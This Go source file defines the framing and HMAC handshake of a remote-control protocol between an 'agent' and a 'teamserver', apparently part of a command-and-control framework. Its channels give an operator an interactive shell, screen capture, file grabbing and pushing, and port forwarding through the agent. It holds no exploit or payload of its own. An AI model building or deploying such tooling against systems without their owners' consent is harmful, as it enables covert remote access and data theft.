package protocol

// Type 2 — RCP (Remote Control Protocol): long-lived, sleep-independent
// multiplexed channel between agent and teamserver (plan §2.3).
//
// Frame (network byte order, 19-byte header):
//
//	Magic(4 "WRCP") | Ver(1) | Chan(4) | Kind(1) | Flags(1) | Seq(4) | Len(4) | Data
//
// Flow (v2): server sends KindChallenge nonce; agent answers KindHello with a
// nonce and HMAC proof (the PSK-derived token never crosses the wire); server
// verifies and returns KindAck with its own proof. Then the server opens
// logical channels with KindOpen (kind tag + args); data rides KindFrame both
// ways; KindClose tears a channel down; KindPing/KindPong keep NAT paths warm.

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
)

var RCPMagic = [4]byte{'W', 'R', 'C', 'P'}

const (
	RCPVersion   = 2
	RCPHeaderLen = 19
	RCPMaxFrame  = 16 << 20 // view frames (PNG) can be large
)

// RCP frame kinds.
const (
	RCPKindHello     byte = 0x01 // agent -> server {agent, nonce, proof}
	RCPKindAck       byte = 0x02 // server -> agent {ok, reason, proof}
	RCPKindOpen      byte = 0x03 // server -> agent {chan, kind, args}
	RCPKindFrame     byte = 0x04 // both: opaque channel bytes (pty out / input / frames)
	RCPKindClose     byte = 0x05 // both: close channel {chan, reason}
	RCPKindPing      byte = 0x06 // keepalive, chan=0
	RCPKindPong      byte = 0x07
	RCPKindChallenge byte = 0x08 // server -> agent {nonce} before the hello
)

// Channel kinds (Open.kind).
const (
	RCPChanShell = "shell" // interactive shell, bidirectional
	RCPChanView  = "view"  // agent -> server screen frames, one-way
	RCPChanFile  = "file"  // Type3 chunked transfer, reliable + resumable (§2.4)
	RCPChanFwd   = "fwd"   // Type2 port forward: server TCP ↔ agent TCP (§2.3)
)

// RCPFlagJSON marks frames whose payload is a FileCtrl/JSON control message;
// unmarked data frames are raw chunk bytes (no escaping, no b64 overhead).
const RCPFlagJSON = 1

// FwdArgs are RCPOpen.Args for RCPChanFwd: the agent must dial Target and
// bridge raw bytes over the channel.
type FwdArgs struct {
	Target string `json:"target"`
}

// FileCtrl is the JSON control language of the file channel. Mode:
// "up" = agent's remote file -> teamserver storage (operator grabs),
// "down" = teamserver file -> agent's filesystem (operator pushes).
// Flow: Open(args=FileCtrl{Op:"begin",Mode,Job,Path,Size,Chunk})
//
//	-> agent   {Op:"ready", Mode, Job}
//	-> server  {Op:"resume", Job, Resume:<chunk index>}
//	-> chunk frames (raw, ordered; TCP guarantees order)
//	-> finisher {Op:"end", Job, SHA256} (up: agent last; down: server last)
//	-> ack     {Op:"done", Job, OK, Reason} from the receiving side.
type FileCtrl struct {
	Op     string `json:"op"` // begin|ready|resume|end|done|error
	Mode   string `json:"mode,omitempty"`
	Job    string `json:"job,omitempty"`
	Path   string `json:"path,omitempty"` // file path on THIS side of the wire
	Size   int64  `json:"size,omitempty"`
	Chunk  int    `json:"chunk,omitempty"`
	Resume int    `json:"resume,omitempty"` // next chunk index expected
	SHA256 string `json:"sha256,omitempty"`
	OK     bool   `json:"ok,omitempty"`
	Reason string `json:"reason,omitempty"`
}

// FileOp constants.
const (
	FileOpBegin  = "begin"
	FileOpReady  = "ready"
	FileOpResume = "resume"
	FileOpEnd    = "end"
	FileOpDone   = "done"
	FileOpError  = "error"
)

var (
	ErrRCPMagic    = errors.New("rcp: bad magic")
	ErrRCPVersion  = errors.New("rcp: unsupported version")
	ErrRCPTooLarge = errors.New("rcp: frame exceeds cap")
)

// RCPFrame is a decoded RCP frame.
type RCPFrame struct {
	Chan    uint32
	Kind    byte
	Flags   byte
	Seq     uint32
	Payload []byte
}

// WriteRCPFrame serializes and writes one frame.
func WriteRCPFrame(w io.Writer, f *RCPFrame) error {
	if len(f.Payload) > RCPMaxFrame {
		return ErrRCPTooLarge
	}
	h := make([]byte, RCPHeaderLen+len(f.Payload))
	copy(h[0:4], RCPMagic[:])
	h[4] = RCPVersion
	binary.BigEndian.PutUint32(h[5:9], f.Chan)
	h[9] = f.Kind
	h[10] = f.Flags
	binary.BigEndian.PutUint32(h[11:15], f.Seq)
	binary.BigEndian.PutUint32(h[15:19], uint32(len(f.Payload)))
	copy(h[RCPHeaderLen:], f.Payload)
	_, err := w.Write(h)
	return err
}

// ReadRCPFrame reads one frame with a length guard.
func ReadRCPFrame(r io.Reader) (*RCPFrame, error) {
	h := make([]byte, RCPHeaderLen)
	if _, err := io.ReadFull(r, h); err != nil {
		return nil, err
	}
	if !equal4(h[0:4], RCPMagic[:]) {
		return nil, ErrRCPMagic
	}
	if h[4] != RCPVersion {
		return nil, ErrRCPVersion
	}
	size := binary.BigEndian.Uint32(h[15:19])
	if size > RCPMaxFrame {
		return nil, ErrRCPTooLarge
	}
	payload := make([]byte, size)
	if size > 0 {
		if _, err := io.ReadFull(r, payload); err != nil {
			return nil, err
		}
	}
	return &RCPFrame{
		Chan:    binary.BigEndian.Uint32(h[5:9]),
		Kind:    h[9],
		Flags:   h[10],
		Seq:     binary.BigEndian.Uint32(h[11:15]),
		Payload: payload,
	}, nil
}

func equal4(a, b []byte) bool { return a[0] == b[0] && a[1] == b[1] && a[2] == b[2] && a[3] == b[3] }

// RCPKey is the 16-byte pre-shared RCP secret for one agent. It is delivered
// to the agent inside the Type1 envelope and is never sent on the RCP wire.
func RCPKey(psk, agentID string) []byte {
	m := hmac.New(sha256.New, []byte(psk))
	m.Write([]byte("rcp|" + agentID))
	return m.Sum(nil)[:16]
}

// RCPToken is the hex form handed out via CmdRCPConnect (Type1, encrypted).
func RCPToken(psk, agentID string) string {
	return hex.EncodeToString(RCPKey(psk, agentID))
}

// RCPKeyFromToken decodes the token the agent received over Type1.
func RCPKeyFromToken(token string) ([]byte, bool) {
	b, err := hex.DecodeString(token)
	if err != nil || len(b) != 16 {
		return nil, false
	}
	return b, true
}

// NewRCPNonce returns a fresh 16-byte hex nonce for one handshake.
func NewRCPNonce() (string, error) {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func rcpProof(key []byte, label, agent, serverNonce, agentNonce string) string {
	m := hmac.New(sha256.New, key)
	m.Write([]byte(label + "|" + agent + "|" + serverNonce + "|" + agentNonce))
	return hex.EncodeToString(m.Sum(nil)[:16])
}

// RCPAgentProof proves knowledge of the agent key to the server.
func RCPAgentProof(key []byte, agent, serverNonce, agentNonce string) string {
	return rcpProof(key, "agent", agent, serverNonce, agentNonce)
}

// RCPServerProof proves knowledge of the same key back to the agent.
func RCPServerProof(key []byte, agent, serverNonce, agentNonce string) string {
	return rcpProof(key, "server", agent, serverNonce, agentNonce)
}

// RCPSessionKey derives material for per-connection frame protection (future).
func RCPSessionKey(key []byte, agent, serverNonce, agentNonce string) []byte {
	m := hmac.New(sha256.New, key)
	m.Write([]byte("session|" + agent + "|" + serverNonce + "|" + agentNonce))
	return m.Sum(nil)
}

// RCPChallenge is the KindChallenge payload (server nonce).
type RCPChallenge struct {
	Nonce string `json:"nonce"`
}

// RCPHello is the KindHello payload. The token itself stays on the Type1
// channel; only a fresh HMAC proof of it is sent here.
type RCPHello struct {
	Agent string `json:"agent"`
	Nonce string `json:"nonce"`
	Proof string `json:"proof"`
}

// RCPAck is the KindAck payload; Proof authenticates the server to the agent.
type RCPAck struct {
	OK     bool   `json:"ok"`
	Reason string `json:"reason,omitempty"`
	Proof  string `json:"proof,omitempty"`
}

// RCPOpen is the KindOpen payload (server -> agent).
type RCPOpen struct {
	Chan uint32          `json:"chan"`
	Kind string          `json:"kind"`
	Args json.RawMessage `json:"args,omitempty"`
}

// RCPClose is the KindClose payload.
type RCPClose struct {
	Chan   uint32 `json:"chan"`
	Reason string `json:"reason,omitempty"`
}

// Shell channel control ops (RCPFlagJSON frames). The server relays them to
// the browser as WebSocket text frames, so the console can adapt its input
// model (real PTY vs. piped stdio) and keep the remote terminal sized.
const (
	RCPOpHello  = "hello"
	RCPOpResize = "resize"
)

// RCPShellHello is the first control frame on a shell channel.
type RCPShellHello struct {
	Op       string `json:"op"`
	TTY      bool   `json:"tty"`
	Shell    string `json:"shell,omitempty"`
	OS       string `json:"os,omitempty"`
	Encoding string `json:"encoding,omitempty"`
}

// RCPResize asks the agent's PTY to match the browser terminal.
type RCPResize struct {
	Op   string `json:"op"`
	Cols uint16 `json:"cols"`
	Rows uint16 `json:"rows"`
}

// P2PProof binds a Type2.5 bridge session: HMAC(psk, "p2p|"+nonce).
// Server computes it for the browser; agent recomputes and proves the
// channel to the operator (docs/P2P_DESIGN.md §3).
func P2PProof(psk, nonce string) string {
	m := hmac.New(sha256.New, []byte(psk))
	m.Write([]byte("p2p|" + nonce))
	return hex.EncodeToString(m.Sum(nil)[:16])
}
